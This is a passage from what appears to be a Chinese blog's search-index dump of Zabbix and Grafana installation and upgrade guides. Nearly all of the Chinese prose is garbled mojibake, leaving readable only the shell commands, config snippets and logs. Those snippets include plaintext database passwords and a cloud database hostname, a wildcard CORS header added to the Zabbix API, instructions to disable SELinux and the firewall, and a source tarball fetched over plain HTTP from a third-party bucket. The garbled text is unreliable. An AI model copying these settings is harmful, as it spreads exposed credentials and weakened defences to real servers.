ä»ä½¿ç”¨è¶‹åŠ¿ä¹‹åçš„è¶‹åŠ¿å°†è¢«ä½¿ç”¨çš„æ—¶é—´ã€‚é»˜è®¤å€¼æ˜¯7å¤©ï¼ˆ7å¤©ï¼‰ã€‚æ‚¨å¯ä»¥åœ¨Grafanaæ ¼å¼çš„æ—¶é—´ã€‚æœ‰æ•ˆæ—¶é—´specificatorsæ˜¯ï¼š ^ h -å°æ—¶ Ã° -å¤© ä¸­å· -ä¸ªæœˆ ç¼“å­˜æ›´æ–°é—´éš”ï¼šæ’ä»¶ç¼“å­˜æé«˜æ€§èƒ½çš„ä¸€äº›APIè¯·æ±‚ã€‚å°†è¯¥å€¼è®¾ç½®ä¸ºæ‰€éœ€çš„ç¼“å­˜ç”Ÿå­˜æœŸï¼ˆæ­¤é€‰é¡¹å½±å“ç±»çš„ç‰©å“åˆ—è¡¨æ•°æ®ï¼‰ã€‚ç„¶åå•å‡»æ·»åŠ  -æ•°æ®æºå°†è¢«æ·»åŠ ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ£€æŸ¥è¿æ¥ æµ‹è¯•è¿æ¥æŒ‰é’®ã€‚æ­¤åŠŸèƒ½å¯ä»¥å¸®åŠ©æ‰¾åˆ°ä¸€äº›é”™è¯¯ï¼Œç±»ä¼¼äºæ— æ•ˆçš„ç”¨æˆ·åæˆ–å¯†ç ï¼Œé”™è¯¯çš„APIç½‘å€ã€‚ å¯¼å…¥ç¤ºä¾‹ä»ªè¡¨æ¿æ‚¨å¯ä»¥ä»ä»ªè¡¨ç›˜å¯¼å…¥ç¤ºä¾‹ä»ªè¡¨æ¿é€‰é¡¹å¡ä¸­çš„æ’ä»¶é…ç½®ã€‚ è¯·æ³¨æ„æœ‰å…³çš„zabbix 2.2æˆ–æ›´ä½ZABBIX 2.4ä¹‹å‰çš„zabbix APIï¼ˆapi_jsonrpc.phpï¼‰ä¸å…è®¸è·¨åŸŸè¯·æ±‚ï¼ˆCORSï¼‰ã€‚ä½ å¯ä»¥å¾—åˆ°HTTPé”™è¯¯412ï¼ˆé¢„å¤„ç†å¤±è´¥ï¼‰ã€‚è¦ä¿®å¤å®ƒæ·»åŠ æ­¤ä»£ç çš„ç‰ˆæƒåï¼Œç«‹å³api_jsonrpc.phpï¼š 12345678910111213 æ ‡é¢˜ï¼ˆâ€œè®¿é—®æ§åˆ¶å…è®¸æ¥æºï¼š*'ï¼‰; æ ‡é¢˜ï¼ˆâ€œè®¿é—®æ§åˆ¶å…è®¸ä¿¡å¤´ï¼šContent-Typeçš„'ï¼‰;æ ‡é¢˜ï¼ˆâ€œè®¿é—®æ§åˆ¶å…è®¸çš„æ–¹æ³•ï¼šPOST'ï¼‰;æ ‡é¢˜ï¼ˆâ€œè®¿é—®æ§åˆ¶ï¼Œæœ€å¤§å¹´é¾„ï¼š1000'ï¼‰;å¦‚æœï¼ˆ$ _ SERVER [ 'REQUEST_METHOD' ] === 'é€‰é¡¹'ï¼‰&#123; è¿”å› ; &#125; ä¹‹å‰ 12require_once dirname( __FILE__ ). '/include/func.inc.php' ;require_once dirname( __FILE__ ). '/include/classes/core/CHttpRequest.php' ; å®Œå…¨ä¿®å¤ä¸Šå¸‚ã€‚æ¬²äº†è§£æ›´å¤šè¯¦æƒ…ï¼Œè¯·å‚è§ZABBIXå‘å‡ºZBXNEXT-1377 å’ŒZBX-8459ã€‚è¯·æ³¨æ„æœ‰å…³æµè§ˆå™¨ç¼“å­˜ æ›´æ–°æ’ä»¶ï¼Œæ¸…é™¤æµè§ˆå™¨ç¼“å­˜å’Œé‡æ–°åŠ è½½åº”ç”¨ç¨‹åºé¡µé¢åã€‚è¯¦æƒ…è¯·å‚è§é“¬ï¼Œ ç«ç‹ã€‚æ‚¨éœ€è¦æ¸…é™¤ç¼“å­˜è€Œå·²ï¼Œæ²¡æœ‰Cookieï¼Œå†å²è®°å½•å’Œå…¶ä»–æ•°æ®ã€‚ å‡çº§ä»2.Xå‡çº§åå¯ç”¨çš„zabbixåº”ç”¨åˆ°æ•°æ®æºï¼Œæ‰“å¼€ä½ çš„é…ç½®çš„zabbixæ•°æ®æºç«¯é€‰æ‹©çš„zabbixä»ç±»å‹åˆ—è¡¨ä¸­å†æ¬¡ã€‚è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºæ’ä»¶IDåœ¨Grafana 3.0æ”¹å˜ã€‚ å‚è€ƒå®˜ç½‘é…ç½®æ•°æ®æºï¼šhttp://docs.grafana-zabbix.org/installation/configuration/ ###å…¥é—¨Grafana-zabbix ä½ ç»è¿‡å®‰è£…å’Œé…ç½®Grafana-zabbixæ•°æ®æºï¼Œè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®€å•çš„ä»ªè¡¨æ¿ã€‚ ä¸‹é¢æ˜¯è‡ªå¸¦çš„æ¨¡æ¿ï¼Œè‡ªå·±æ–°å»ºçš„æ¨¡æ¿åœ¨æˆ‘githubä¸Šé¢æœ‰è¯¦ç»†çš„åˆ›å»ºæ­¥éª¤ã€‚ å…¥é—¨gafanaåˆ›å»ºä»ªè¡¨æ¿ï¼šGrafana-github å¯å‚è€ƒï¼šhttps://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage zabbix-server2.4æœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix-serveræœåŠ¡ç«¯ç¼–è¯‘å®‰è£… zabbix2.4ç›‘æ§80ç«¯å£çŠ¶æ€ : zabbixç›‘æ§80ç«¯å£çŠ¶æ€ zabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ ï¼šzabbix+Grafanaå®‰è£…ä½¿ç”¨ç›‘æ§ç»“åˆ zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ : zabbixç›‘æ§MySQL-æ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹ zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ : zabbixçš„ICMP_Pingæ¨¡ç‰ˆå®ç°å¯¹å®¢æˆ·ç«¯ç½‘ç»œçŠ¶æ€çš„ç›‘æ§ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“ zabbixæ€§èƒ½ç›‘æ§æ•…éšœæ€»ç»“","link":"/2016/06/17/æ€§èƒ½ç›‘æ§/Zabbix/zabbix-Grafanaå®‰è£…ä½¿ç”¨ç»“åˆ/"},{"title":"zabbix-server2.4å…¨æ–°å‡çº§3.0ç‰ˆæœ¬","text":"zabbix3.0å‡ºæ¥äº†ä¸€æ®µæ—¶é—´äº†ï¼Œæœ€è¿‘å¿ä¸ä½æŠŠå…¬å¸åŸæ¥çš„2.4.7ç‰ˆæœ¬å‡çº§åˆ°äº†3.0ã€‚zabbixå‡çº§å…¶å®å¾ˆç®€å•ï¼ŒåŸºæœ¬æ­¥éª¤ä¸ºï¼šå¤‡ä»½-&gt;é‡æ–°å®‰è£…æ–°ç‰ˆæœ¬ã€‚æ¥ä¸‹æ¥ç®€å•å†™ä¸‹è¿™æ¬¡å‡çº§çš„æ“ä½œå’Œé—®é¢˜ 1ã€ å…³é—­zabbix serveré˜²æ­¢æœ‰æ–°çš„æ•°æ®æäº¤åˆ°æ•°æ®åº“ä¸­ã€ç›´æ¥å…³é—­æ•°æ®åº“æ•ˆæœä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚è¿™é‡Œæˆ‘å…ˆå…³é—­æ‰æˆ‘çš„æœåŠ¡ï¼š 12/etc/init.d/zabbix_server stop å…³é—­äº†serveræœåŠ¡ç«¯/etc/init.d/zabbix_agentd stop å…³é—­äº†agentå®¢æˆ·ç«¯ 2ã€ å¤‡ä»½2.1 å¤‡ä»½æ•°æ®åº“æœ€ç®€å•çš„å¤‡ä»½ï¼šå…³é—­æ•°æ®ï¼Œæ•´ä¸ªæ•°æ®åº“ç›®å½•copyä¸€ä»½ã€‚è™½è¯´å‡çº§ä¸€èˆ¬ä¸ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å®‰å…¨èµ·è§è¿˜æ˜¯æœ‰å¿…è¦å¤‡ä»½ä¸€ä¸‹ï¼Œå°±ç®—å‡çº§æˆåŠŸï¼Œä½†æ˜¯ä¸èƒ½ä¿è¯æ–°ç‰ˆæœ¬è®©ä½ å–œæ¬¢ï¼Œè¿™ä¸ªæ—¶å€™å›é€€ä¹Ÿæœ‰åè·¯ã€‚ è¿™é‡Œæˆ‘ç”¨çš„æ˜¯å‘½ä»¤å¯¼å‡ºçš„ï¼šä¹Ÿå¯ä»¥ç”¨NAvicatï¼Œå¯¼å‡ºç»“æ„å’Œæ•°æ®ã€‚ 12345678910111213141516mysqldump -u root -p***** -h MySQLIPåœ°å€ --opt --skip-lock-tables --flush-logs --database zabbix &gt; /tmp/zabbix.sqlmysqldump -uroot -p -P7306 --opt --skip-lock-tables --flush-logs --database zabbix3 --ignore-table=zabbix.history --ignore-table=zabbix.history_log --ignore-table=zabbix.history_str --ignore-table=zabbix.history_text --ignore-table=zabbix.history_uint --ignore-table=zabbix.trends --ignore-table=zabbix.trends_uint &gt;/root/zabbix20183026.sqlWarning: Using a password on the command line interface can be insecure.Warning: Using unique option prefix database instead of databases is deprecated and will be removed in a future release. Please use the full name instead.mysqldump: Got error: 1227: Access denied; you need (at least one of) the RELOAD privilege(s) for this operation when doing refreshæç¤ºï¼šLogin to mysql as root and enter your command:FLUSH PRIVILEGES; æ³¨æ„ï¼šzabbixæ•°æ®åº“å¤‡ä»½å¯ä»¥å¤‡ä»½æ•´ä¸ª/var/lib/zabbixç›®å½•ä¸‹æ‰€æœ‰æ•°æ®ï¼Œä½†æ˜¯æ–‡ä»¶æ¯”è¾ƒå¤§ï¼Œå¾ˆå ç©ºé—´ã€‚ä¸å»ºè®®è¿™ä¹ˆåšã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåªå¤‡ä»½zabbixçš„è¡¨æ–‡ä»¶ï¼Œå†å²æ•°æ®å’Œè¶‹åŠ¿æ•°æ®çš„è¡¨ä¸å¤‡ä»½ã€‚ 2.2 å¤‡ä»½æ–‡ä»¶å¤‡ä»½é…ç½®æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/etc/zabbixï¼‰ã€phpç½‘ç«™æºç ã€zabbixäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæ•´ä¸ªç¨‹åºç›®å½•å¤‡ä»½å°±OKï¼‰ 123456789å¤‡ä»½é…ç½®æ–‡ä»¶ï¼š mv /usr/local/zabbix/ /usr/local/zabbix.2.4.7å¤‡ä»½å¯åŠ¨è„šæœ¬ï¼š mv /etc/init.d/zabbix_server /etc/init.d/zabbix_server.2.4.7 mv /etc/init.d/zabbix_agentd /etc/init.d/zabbix_agentd.2.4.7å¤‡ä»½zabbix.phpæ–‡ä»¶ï¼š mv /var/www/html/zabbix/ /var/www/html/zabbix.2.4.7 3ã€å®‰è£…é…ç½®3.1 å®‰è£…Zabbix server é‡æ–°å®‰è£…æ–°ç‰ˆæœ¬é‡å¤´å®‰è£…ä¸€æ¬¡zabbixï¼Œä¹Ÿå°±æ˜¯configure â€“â€¦ make make install.å¤‡æ³¨ï¼šä¸€èˆ¬é«˜ç‰ˆæœ¬zabbix serverå…¼å®¹ä½ç‰ˆæœ¬zabbixå®¢æˆ·ç«¯ã€‚å¦‚æœå‘ç°æœ‰å¼‚å¸¸ï¼Œé‚£ä¹ˆä½ çš„zabbixå®¢æˆ·ç«¯ä¹Ÿç›¸åº”å‡çº§ä¸€ä¸‹ã€‚å®¢æˆ·ç«¯å‡çº§æ¯”è¾ƒç®€å•ï¼šæ›´æ–°äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶å¯¹ç…§ä¸‹æ˜¯å¦æœ‰ä¿®æ”¹å³å¯ã€‚ ä¸‹è½½zabbix3.0ç‰ˆæœ¬ï¼Œè§£å‹å®‰è£… 123456789101112131415161718wget http://oak0aohum.bkt.clouddn.com/zabbix-3.0.3.tar.gz -c /tmp/cd /tmp/tar zxf zabbix-3.0.3.tar.gz./configure --prefix=/usr/local/zabbix --enable-server --with-mysql --with-net-snmp --with-libxml2 --with-libcurl --with-openipmi --enable-proxy --enable-agent --enable-java --with-ldapå¦‚æœç¼–è¯‘å¤±è´¥æ²¡æœ‰libxml2 ldap éœ€è¦yumå®‰è£…ä¸‹ï¼šyum install openldap openldap-devel libxml2* -y ç¼–è¯‘æˆåŠŸè¿™é‡Œä¼šå‡ºç°ï¼š************************************************************ Now run 'make install' ** ** Thank you for using Zabbix! ** &lt;http://www.zabbix.com&gt; ************************************************************#ç›´æ¥make install å®‰è£…å³å¯ï¼š make install è¿™é‡Œç¼–è¯‘å®‰è£… æˆ‘åŠ ä¸Šäº†ï¼šâ€“enable-java è¿™æ ·é˜²æ­¢åæœŸç›‘æ§tomcatéœ€è¦é‡æ–°ç¼–è¯‘ã€‚å®‰è£…å¥½ä»¥åï¼š 3.2 æ£€æŸ¥é…ç½®æ–‡ä»¶zabbix_server.confé…ç½®å‚æ•°å¯èƒ½ä¼šæœ‰å˜åŒ–ï¼Œä¿®æ”¹å˜æ›´åçš„å‚æ•°ï¼Œæˆ–è€…ç›´æ¥ä¿®æ”¹æ–°çš„é…ç½®æ–‡ä»¶ã€‚ 1.1 å¯¹ç…§è€ç‰ˆæœ¬çš„zabbix_server.confè¿›è¡Œä¿®æ”¹ï¼Œä¸èƒ½ç›´æ¥æ›¿æ¢ã€‚ 123456789101112131415vim /usr/local/zabbix/etc/LogFile=/tmp/zabbix_server.logDBHost=rdsm5t6w65741u8q1y53.mysql.rds.aliyuncs.comDBName=zabbixDBUser=zabbixDBPassword=zabbix2015StartPollers=12JavaGateway=127.0.0.1JavaGatewayPort=10052StartJavaPollers=5Timeout=4FpingLocation=/usr/local/fping/sbin/fpingLogSlowQueries=3000AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts 1.2 COPYç›¸å…³è„šæœ¬åˆ°æ–°ç¼–è¯‘çš„ç›®å½•ä¸‹ 12345678 cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_server /etc/rc.d/init.d/zabbix_server[root@salt etc]# cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_agentd /etc/rc.d/init.d/zabbix_agentdvim /etc/init.d/zabbix_server BASEDIR=/usr/local/zabbix/ vim /etc/init.d/zabbix_agentdBASEDIR=/usr/local/zabbix 1.3 alertscriptså’Œexternalscripts é‡Œé¢çš„ç›¸å…³è„šæœ¬å¤åˆ¶åˆ°æ–°çš„å®‰è£…ç›®å½•ä¸‹ã€‚ 12cp /usr/local/zabbix.2.4.7/share/zabbix/alertscripts/* /usr/local/zabbix/share/zabbix/alertscripts/.chown -R zabbix:zabbix /usr/local/zabbix/share/zabbix/alertscripts/* 4ã€ éƒ¨ç½²zabbix PHPæºç 4.1 å°†æ–°çš„å‰ç«¯PHPä»£ç ä¹ŸCOPYåˆ°å¯¹åº”çš„ç›®å½•ä¸‹ã€‚ 123456cd /tmp/cp -r /zabbix-3.0.3/frontends/php /var/www/html/zabbixcd /var/www/html/chown -R zabbix:zabbix zabbixcp zabbix.2.4.7/conf/zabbix.conf.php zabbix/conf/zabbix.conf.php æ‹·è´ä¸‹phpæ–‡ä»¶è¿™æ ·æ•°æ®å°±èƒ½è®¿é—®åŒæ­¥è¿‡æ¥äº†ã€‚ ç„¶åé‡å¯æœåŠ¡ã€‚ å‘ç°å‡ºç°500 ç½‘é¡µæ— æ³•æ˜¾ç¤ºï¼Œæˆ‘å»ç½‘ä¸ŠGoogleäº†ä¸‹ï¼Œè¯´æˆ‘çš„PHPæ–‡ä»¶ç‰ˆæœ¬è¿‡ä½ã€‚ æˆ‘æŸ¥çœ‹äº†ä¸‹æˆ‘çš„ç‰ˆæœ¬ï¼š 1234567php -versionPHP 5.3.3 (cli) (built: Feb 9 2016 10:36:17)Copyright (c) 1997-2010 The PHP GroupZend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologieswhereis phpphp: /usr/bin/php /etc/php.d /etc/php.ini /usr/lib64/php /usr/share/php /usr/share/man/man1/php.1.gz æŸ¥è¯¢äº†ä¸‹è¿™æ˜¯é»˜è®¤å®‰è£…çš„ï¼Œyumå®‰è£…çš„ã€‚ mv /usr/share/php/ /usr/share/php.5.3.3å¤‡ä»½ä¹‹å‰çš„æ–¹ä¾¿å›æ»šï¼Œç„¶åå‡çº§PHPï¼š å¿«é€Ÿå°†PHP 5.3å‡çº§è‡³PHP 5.5CentOS 6.7ä»¥ä¸‹ä¸º CentOS ä¸‹å®‰è£… PHP æ–¹æ³•ï¼š æ·»åŠ  epel æº 1# rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm æ·»åŠ  remi æº 1# rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm å®‰è£… PHP 1# yum --enablerepo=remi,remi-php55 install php-fpm php-common php-devel php-mysqlnd php-mbstring php-mcrypt æŸ¥çœ‹ PHP ç‰ˆæœ¬ 1234# php -vPHP 5.5.9 (cli) (built: Feb 11 2014 08:25:33)Copyright (c) 1997-2014 The PHP GroupZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies å¯åŠ¨ php-fpm 12# service php-fpm startStarting php-fpm: [ OK ] è¿™é‡Œé‡å¯å®Œä»¥åï¼Œè®°å¾—è¦è®©phpç”Ÿæ•ˆï¼Œä¸ç„¶çš„è¯ä¸è¡Œã€‚ æˆ‘ä¸€å¼€å§‹åˆ·æ–°è¿˜æ˜¯å‡ºç°äº†500é”™è¯¯ï¼Œåæ¥ç”¨phpæŒ‡é’ˆæµ‹è¯•äº†ä¸‹ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ wwwç«™ç‚¹æ·»åŠ ã€‚info.php 12345&lt;?php phpinfo();?&gt;; è®¿é—®åœ°å€/info.php å‡ºç°ç‰ˆæœ¬æ˜¯5.3 ç¯å¢ƒé—®é¢˜ï¼Œé‡å¯httpå°±å¯ä»¥äº†ã€‚ è¿™é‡Œå·²ç»æå®šå’¯ã€‚ å¦‚æœå‡ºç°å›¾å½¢ä¹±ç ï¼šå¯ä»¥å‚è€ƒä¸‹é¢çš„æ–‡æ¡£ã€‚ å…¶å®æŠŠä¹‹å‰çš„å­—ä½“æ‹·è´è¿‡å»ï¼Œç„¶åå…ˆä¿®æ”¹ä¸‹é…ç½®æ–‡ä»¶å³å¯ã€‚ 1cp /var/www/html/zabbix.2.4.7/fonts/simkai.ttf /var/www/html/zabbix/fonts/. 3.0ç‰ˆæœ¬å‡çº§ä»¥åå…¶å®å°±æ˜¯ä¸ªæ•°æ®åº“ä¸å˜ï¼Œå…¶ä»–çš„é‡æ–°å®‰è£…ä¸€éå³å¯ã€‚ 10å¤šåˆ†é’Ÿå°±å¯ä»¥æå®šçš„ã€‚ å‡çº§é‡åˆ°çš„é—®é¢˜ The frontend does not match Zabbix database. Current database version (mandatory/optional): 2050119/2050119. Required mandatory version: 3000000. Contact your system administrator.ç™»å½•åˆ°æ•°æ®åº“æ‰§è¡Œä¸‹é¢çš„sql,å°±å¯ä»¥ä¿®å¤è¿™ä¸ªé—®é¢˜ 1mysql&gt;update dbversion set mandatory=3000000; 2 zabbix å†…å­˜æº¢å‡ºè·‘äº†æ–°ç‰ˆæœ¬1å¤©ï¼Œè€æ˜¯å¯åŠ¨ä¸èµ·æ¥zabbix_server ï¼Œçœ‹æ—¥å¿—å‡ºç°ä¸‹åˆ—é—®é¢˜ 123456789101112131415161718192021222316701:20140925:191733.530 Starting Zabbix Server. Zabbix 3.0.3 (revision 48953).16701:20140925:191733.530 ****** Enabled features ******16701:20140925:191733.530 SNMP monitoring: YES16701:20140925:191733.530 IPMI monitoring: YES16701:20140925:191733.530 WEB monitoring: YES16701:20140925:191733.530 VMware monitoring: NO16701:20140925:191733.530 Jabber notifications: NO16701:20140925:191733.530 Ez Texting notifications: YES16701:20140925:191733.530 ODBC: NO16701:20140925:191733.530 SSH2 support: NO16701:20140925:191733.531 IPv6 support: NO16701:20140925:191733.531 ******************************16701:20140925:191733.531 using configuration file: /opt/zabbix/etc/zabbix_server.conf15996:20140925:191145.759 completed 97% of database upgrade15996:20140925:191147.139 completed 98% of database upgrade15996:20140925:191147.422 completed 99% of database upgrade15996:20140925:191147.428 completed 100% of database upgrade15996:20140925:191147.428 database upgrade fully completed15996:20140925:191148.800 __mem_malloc: skipped 0 asked 48 skip_min 0 skip_max 429496729515996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): out of memory (requested 44 bytes)15996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): please increase CacheSize configuration parameter15996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): out of memory (requested 44 bytes)15996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): please increase CacheSize configuration parameter è§£å†³æ‰“å¼€zabbix_server.confæ‰¾åˆ° Option: CacheSizeæŠŠåŸæ¥çš„# CacheSize=8M å‰é¢çš„#æ³¨é‡Šå»æ‰ï¼Œå°†8Mä¿®æ”¹ä¸º1024ï¼Œè¿™ä¸ª1024æ ¹æ®æœåŠ¡å™¨æ€§èƒ½ä¿®æ”¹ã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2016/06/18/æ€§èƒ½ç›‘æ§/Zabbix/zabbix-server2-4å…¨æ–°å‡çº§3-0ç‰ˆæœ¬/"},{"title":"zabbix-server3.0.3ç‰ˆæœ¬ç¯å¢ƒå®‰è£…éƒ¨ç½²","text":"ç³»ç»Ÿç¯å¢ƒï¼š 192.168.1.170 MySQLä¸» 192.168.1.183 zabbix-server CentOS Linux release 7.2.1511 (Core) zabbixæºç ä¸‹è½½ : http://www.zabbix.com/download.php ä¾èµ–ä¸‹è½½ï¼š https://github.com/zabbixcn/curl-rpm/tree/master/RPMS zabbix Downä¸‹è½½å®‰è£…åŒ…ï¼šhttp://repo.zabbix.com/zabbix/3.2/rhel/6/x86_64/ zabbix3.2 http://jaist.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/3.2.4/zabbix-3.2.4.tar.gz ç¬¬ä¸€æ­¥zabbixï¼šå…³é—­æœ¬æœºä¸Šçš„selinuxä¸iptablesæœåŠ¡ 1ã€å…³é—­SELinux 123456#ä¸‹é¢çš„å‘½ä»¤å®ç°æ°¸ä¹…å…³é—­SELinux sed -i 's/^SELINUX=.*/#&amp;/;s/^SELINUXTYPE=.*/#&amp;/;/SELINUX=.*/a SELINUX=disabled' /etc/sysconfig/selinux#ä¸‹é¢çš„å‘½ä»¤å®ç°ä¸´æ—¶å…³é—­SELinux/usr/sbin/setenforce 0/usr/sbin/setenforce: SELinux is disabled ä¹Ÿå¯ä»¥è®¾ç½®å¼€æ”¾ç«¯å£å‡ºå»ã€‚ CentOS 7.0é»˜è®¤ä½¿ç”¨çš„æ˜¯firewallä½œä¸ºé˜²ç«å¢™ï¼Œè¿™é‡Œæ”¹ä¸ºiptablesé˜²ç«å¢™ã€‚ firewallï¼š 123systemctl start firewalld.service#å¯åŠ¨firewallsystemctl stop firewalld.service#åœæ­¢firewallsystemctl disable firewalld.service#ç¦æ­¢firewallå¼€æœºå¯åŠ¨ CentOS7é»˜è®¤çš„é˜²ç«å¢™ä¸æ˜¯iptables,è€Œæ˜¯firewalle.centos 7 çš„é»˜è®¤æ²¡æœ‰å®‰è£…iptables éœ€è¦å®‰è£…ï¼š 123yum install iptables-services#ä¿å­˜ä¸Šè¿°è§„åˆ™ service iptables save ç­‰ä¼šå†æ·»åŠ ç«¯å£ï¼š10050 ï¼Œ10051 æ­å»ºLAMPç¯å¢ƒï¼Œæˆ–LNMPç¯å¢ƒ 1yum install mysql-server httpd php â€“y å®‰è£…å…¶å®ƒä¾èµ–åŒ… 1yum install mysql-devel gcc net-snmp-devel curl-devel perl-DBI php-gd php-mysql php-bcmath php-mbstring php-xml â€“y gcc OpenIPMI-devel net-snmp-devel.x86_64 libxml2-devel mysql-devel è¿™é‡ŒMySQLæˆ‘å·²ç»åœ¨MySQLæœåŠ¡å™¨ä¸Šé¢å®‰è£…å¥½äº†ã€‚åªéœ€è¦åˆ›å»ºä¸ªæ–°çš„zabbixæ•°æ®åº“å³å¯ã€‚ å¢åŠ zabbixç”¨æˆ·å’Œç»„ 12groupadd zabbixuseradd â€“g zabbix â€“m zabbix ä¸‹è½½zabbix3.0ç‰ˆæœ¬ï¼Œè§£å‹å®‰è£… 123456789101112131415wget http://oak0aohum.bkt.clouddn.com/zabbix-3.0.3.tar.gz -c /tmp/cd /tmp/tar zxf zabbix-3.0.3.tar.gz./configure --prefix=/usr/local/zabbix --enable-server --with-mysql --with-net-snmp --with-libxml2 --with-libcurl --with-openipmi --enable-proxy --enable-agent --enable-java --with-ldapç¼–è¯‘æˆåŠŸè¿™é‡Œä¼šå‡ºç°ï¼š************************************************************ Now run 'make install' ** ** Thank you for using Zabbix! ** &lt;http://www.zabbix.com&gt; ************************************************************#ç›´æ¥make install å®‰è£…å³å¯ï¼š make install è¿™é‡Œç¼–è¯‘å®‰è£… æˆ‘åŠ ä¸Šäº†ï¼šâ€“enable-java è¿™æ ·é˜²æ­¢åæœŸç›‘æ§tomcatéœ€è¦é‡æ–°ç¼–è¯‘ã€‚ 3.é…ç½®æ•°æ®åº“ ç™»é™†åˆ°192.168.1.170æœåŠ¡å™¨ä¸Šé¢ï¼š 12# mysql -e \"create database zabbix character set utf8 collate utf8_bin;\" #ä¿®æ”¹æ—¶åŒº# mysql -e \"grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';\" #åˆ›å»ºæ•°æ®åº“å è¿™é‡Œæˆ‘è®¾ç½®äº†åªèƒ½192.168.1.0ç½‘æ®µå¯ä»¥è®¿é—®æ•°æ®åº“ã€‚ æ‰€ä»¥è¿™é‡Œåˆ›å»ºæ•°æ®åº“ç›´æ¥è¿™ä¹ˆæ“ä½œäº†ã€‚ 1234567891011121314151617181920[root@mysql ~]# mysql -uroot -pIhaozhuo_b313 -h 192.168.1.170Warning: Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 10Server version: 5.6.20-log MySQL Community Server (GPL)Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; create database zabbix character set utf8 collate utf8_bin;Query OK, 1 row affected (0.06 sec)mysql&gt; GRANT ALL ON zabbix.* TO 'zabbix'@'192.168.1.%' IDENTIFIED BY 'zabbix123.com';Query OK, 0 rows affected (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) å››.å¯¼å…¥æ•°æ®åº“æ–‡ä»¶ï¼š1cd /usr/share/doc/zabbix-server-mysql-2.4.8/create æ“ä½œä¸‰æ¡å‘½ä»¤æŠŠæ•°æ®å¯¼å…¥åˆ°åœ¨æŒ‡å®šçš„MySQLï¼šzabbix 123mysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; schema.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; images.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; data.sql äº”ã€é…ç½®æ–‡ä»¶åŠwebå‰ç«¯æ–‡ä»¶ä¿®æ”¹æ·»åŠ æœåŠ¡ç«¯å£ vi /etc/services #ç¼–è¾‘ï¼Œåœ¨æœ€åæ·»åŠ ä»¥ä¸‹ä»£ç  123456# Zabbixzabbix-agent 10050/tcp # Zabbix Agentzabbix-agent 10050/udp # Zabbix Agentzabbix-trapper 10051/tcp # Zabbix Trapperzabbix-trapper 10051/udp # Zabbix Trapper:wq! #ä¿å­˜é€€å‡º æ·»åŠ åå¦‚ä¸‹ 12345# grep zabbix /etc/serviceszabbix-agent 10050/tcp #ZabbixAgentzabbix-agent 10050/udp #ZabbixAgentzabbix-trapper 10051/tcp #ZabbixTrapperzabbix-trapper 10051/udp #ZabbixTrapper ä¿®æ”¹zabbixé…ç½®æ–‡ä»¶ vim /usr/local/zabbix/etc/zabbix_server.conf 12345DBName=zabbix #æ•°æ®åº“åç§°DBUser=zabbix #æ•°æ®åº“ç”¨æˆ·åDBPassword=zabbix123.com #æ•°æ®åº“å¯†ç ListenIP=192.168.1.170 #æ•°æ®åº“ipåœ°å€AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts #zabbixè¿è¡Œè„šæœ¬å­˜æ”¾ç›®å½• :wq! #ä¿å­˜é€€å‡º 1234vi 